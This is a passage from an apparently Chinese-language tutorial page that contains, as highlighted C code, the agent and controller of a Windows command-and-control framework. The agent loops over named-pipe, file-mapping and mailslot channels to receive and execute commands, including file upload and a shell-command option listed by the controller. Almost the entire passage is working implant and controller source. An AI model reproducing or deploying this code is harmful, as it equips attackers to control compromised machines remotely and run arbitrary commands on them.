+<span class="line"><span style="color:#E1E4E8">                        pCmd->dwDataSize </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> (sep </span><span style="color:#F97583">-</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)pCmd->bData) </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#F97583">                        &#x26;</span><span style="color:#E1E4E8">dwWritten, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">                    CloseHandle</span><span style="color:#E1E4E8">(hFile);</span></span>
+<span class="line"><span style="color:#B392F0">                    strcpy</span><span style="color:#E1E4E8">((</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)response.bData, </span><span style="color:#9ECBFF">"Upload OK"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">                    response.dwDataSize </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 10</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        case</span><span style="color:#E1E4E8"> CMD_EXIT:</span></span>
+<span class="line"><span style="color:#E1E4E8">            pCtx->State </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> AGENT_STOPPED;</span></span>
+<span class="line"><span style="color:#E1E4E8">            pCtx->bRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">            strcpy</span><span style="color:#E1E4E8">((</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)response.bData, </span><span style="color:#9ECBFF">"Agent exiting"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">            response.dwDataSize </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 14</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 发送响应</span></span>
+<span class="line"><span style="color:#B392F0">    EnterCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pCtx->cs);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (pCtx->Channels[pCtx->nActiveChannel]) {</span></span>
+<span class="line"><span style="color:#B392F0">        IPC_Send</span><span style="color:#E1E4E8">(pCtx->Channels[pCtx->nActiveChannel], </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">response);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#B392F0">    LeaveCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pCtx->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 工作线程</span></span>
+<span class="line"><span style="color:#E1E4E8">DWORD WINAPI </span><span style="color:#B392F0">WorkerThread</span><span style="color:#E1E4E8">(LPVOID </span><span style="color:#FFAB70">lpParam</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PAGENT_CONTEXT pCtx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PAGENT_CONTEXT)lpParam;</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_MESSAGE msg;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (pCtx->bRunning) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 尝试从所有通道接收</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 4</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> pCtx->bRunning; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pCtx->Channels[i]) </span><span style="color:#F97583">continue</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">IPC_Receive</span><span style="color:#E1E4E8">(pCtx->Channels[i], </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">msg, </span><span style="color:#79B8FF">1000</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#E1E4E8">                pCtx->nActiveChannel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i;</span></span>
+<span class="line"><span style="color:#B392F0">                Agent_ExecuteCommand</span><span style="color:#E1E4E8">(pCtx, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">msg);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        Sleep</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">PAGENT_CONTEXT </span><span style="color:#B392F0">Agent_Initialize</span><span style="color:#E1E4E8">(DWORD </span><span style="color:#FFAB70">dwId</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PAGENT_CONTEXT pCtx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PAGENT_CONTEXT)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(AGENT_CONTEXT));</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pCtx) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    memset</span><span style="color:#E1E4E8">(pCtx, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(AGENT_CONTEXT));</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->dwAgentId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dwId;</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->State </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> AGENT_IDLE;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    InitializeCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pCtx->cs);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 初始化多个通信通道</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#FFAB70"> name</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf</span><span style="color:#E1E4E8">(name, </span><span style="color:#9ECBFF">"agent_</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, dwId);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 尝试创建多种通道</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->Channels[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE_FILEMAPPING, name, </span><span style="color:#79B8FF">FALSE</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->Channels[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE_NAMEDPIPE, name, </span><span style="color:#79B8FF">FALSE</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->Channels[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE_MAILSLOT, name, </span><span style="color:#79B8FF">FALSE</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 检查至少有一个通道可用</span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL bHasChannel </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (pCtx->Channels[i]) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            bHasChannel </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            pCtx->nActiveChannel </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> i;</span></span>
+<span class="line"><span style="color:#F97583">            break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">bHasChannel) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[Agent] No channel available</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> pCtx;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">BOOL </span><span style="color:#B392F0">Agent_Start</span><span style="color:#E1E4E8">(PAGENT_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pCtx) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->bRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->State </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> AGENT_RUNNING;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启动心跳线程</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->hHeartbeatThread </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateThread</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#79B8FF">        NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, HeartbeatThread, pCtx, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 启动工作线程</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->hWorkerThread </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateThread</span><span style="color:#E1E4E8">(</span></span>
+<span class="line"><span style="color:#79B8FF">        NULL</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, WorkerThread, pCtx, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">VOID </span><span style="color:#B392F0">Agent_Shutdown</span><span style="color:#E1E4E8">(PAGENT_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pCtx) </span><span style="color:#F97583">return</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->bRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> FALSE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (pCtx->hHeartbeatThread) {</span></span>
+<span class="line"><span style="color:#B392F0">        WaitForSingleObject</span><span style="color:#E1E4E8">(pCtx->hHeartbeatThread, </span><span style="color:#79B8FF">3000</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(pCtx->hHeartbeatThread);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (pCtx->hWorkerThread) {</span></span>
+<span class="line"><span style="color:#B392F0">        WaitForSingleObject</span><span style="color:#E1E4E8">(pCtx->hWorkerThread, </span><span style="color:#79B8FF">3000</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(pCtx->hWorkerThread);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (pCtx->Channels[i]) {</span></span>
+<span class="line"><span style="color:#B392F0">            IPC_DestroyChannel</span><span style="color:#E1E4E8">(pCtx->Channels[i]);</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    DeleteCriticalSection</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pCtx->cs);</span></span>
+<span class="line"><span style="color:#B392F0">    free</span><span style="color:#E1E4E8">(pCtx);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-11">项目3：C2 Controller控制端</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// C2Controller.c - C2控制端</span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdlib.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> "IPCLib.h"</span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> "C2Agent.h"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#E1E4E8"> _CONTROLLER_CONTEXT {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PIPC_CHANNEL </span><span style="color:#FFAB70">Channels</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8"> nAgents;</span></span>
+<span class="line"><span style="color:#E1E4E8">    BOOL bRunning;</span></span>
+<span class="line"><span style="color:#E1E4E8">} CONTROLLER_CONTEXT, </span><span style="color:#F97583">*</span><span style="color:#E1E4E8">PCONTROLLER_CONTEXT;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">PCONTROLLER_CONTEXT </span><span style="color:#B392F0">Controller_Initialize</span><span style="color:#E1E4E8">(DWORD </span><span style="color:#FFAB70">dwAgentId</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    PCONTROLLER_CONTEXT pCtx </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (PCONTROLLER_CONTEXT)</span><span style="color:#B392F0">malloc</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(CONTROLLER_CONTEXT));</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pCtx) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> NULL</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    memset</span><span style="color:#E1E4E8">(pCtx, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(CONTROLLER_CONTEXT));</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#FFAB70"> name</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf</span><span style="color:#E1E4E8">(name, </span><span style="color:#9ECBFF">"agent_</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, dwAgentId);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 创建服务端通道</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->Channels[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE_FILEMAPPING, name, </span><span style="color:#79B8FF">TRUE</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->Channels[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE_NAMEDPIPE, name, </span><span style="color:#79B8FF">TRUE</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->Channels[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#B392F0"> IPC_CreateChannel</span><span style="color:#E1E4E8">(IPC_TYPE_MAILSLOT, name, </span><span style="color:#79B8FF">TRUE</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    pCtx->bRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> TRUE</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> pCtx;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> Controller_SendCommand</span><span style="color:#E1E4E8">(PCONTROLLER_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">, DWORD </span><span style="color:#FFAB70">dwCmd</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_MESSAGE msg </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">    msg.dwMsgId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dwCmd;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (data) {</span></span>
+<span class="line"><span style="color:#B392F0">        strcpy</span><span style="color:#E1E4E8">((</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)msg.bData, data);</span></span>
+<span class="line"><span style="color:#E1E4E8">        msg.dwDataSize </span><span style="color:#F97583">=</span><span style="color:#B392F0"> strlen</span><span style="color:#E1E4E8">(data) </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 通过所有可用通道发送</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (pCtx->Channels[i]) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">IPC_Send</span><span style="color:#E1E4E8">(pCtx->Channels[i], </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">msg)) {</span></span>
+<span class="line"><span style="color:#B392F0">                printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[Controller] Command sent via channel </span><span style="color:#79B8FF">%d\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, i);</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> Controller_ReceiveLoop</span><span style="color:#E1E4E8">(PCONTROLLER_CONTEXT </span><span style="color:#FFAB70">pCtx</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    IPC_MESSAGE msg;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    while</span><span style="color:#E1E4E8"> (pCtx->bRunning) {</span></span>
+<span class="line"><span style="color:#F97583">        for</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">int</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">; i </span><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF"> 4</span><span style="color:#E1E4E8">; i</span><span style="color:#F97583">++</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pCtx->Channels[i]) </span><span style="color:#F97583">continue</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">IPC_Receive</span><span style="color:#E1E4E8">(pCtx->Channels[i], </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">msg, </span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">)) {</span></span>
+<span class="line"><span style="color:#F97583">                switch</span><span style="color:#E1E4E8"> (msg.dwMsgId) {</span></span>
+<span class="line"><span style="color:#F97583">                    case</span><span style="color:#E1E4E8"> CMD_HEARTBEAT:</span></span>
+<span class="line"><span style="color:#B392F0">                        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[Heartbeat] </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, msg.bData);</span></span>
+<span class="line"><span style="color:#F97583">                        break</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">                    default</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#B392F0">                        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[Response] Cmd=</span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF"> Data=</span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span></span>
+<span class="line"><span style="color:#E1E4E8">                               msg.dwMsgId, msg.bData);</span></span>
+<span class="line"><span style="color:#E1E4E8">                }</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#B392F0">        Sleep</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">int</span><span style="color:#B392F0"> main</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== C2 Controller ===</span><span style="color:#79B8FF">\n\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    PCONTROLLER_CONTEXT pCtx </span><span style="color:#F97583">=</span><span style="color:#B392F0"> Controller_Initialize</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1001</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">pCtx) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Failed to initialize controller</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Controller ready. Commands:</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"  shell &#x3C;cmd>  - Execute shell command</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
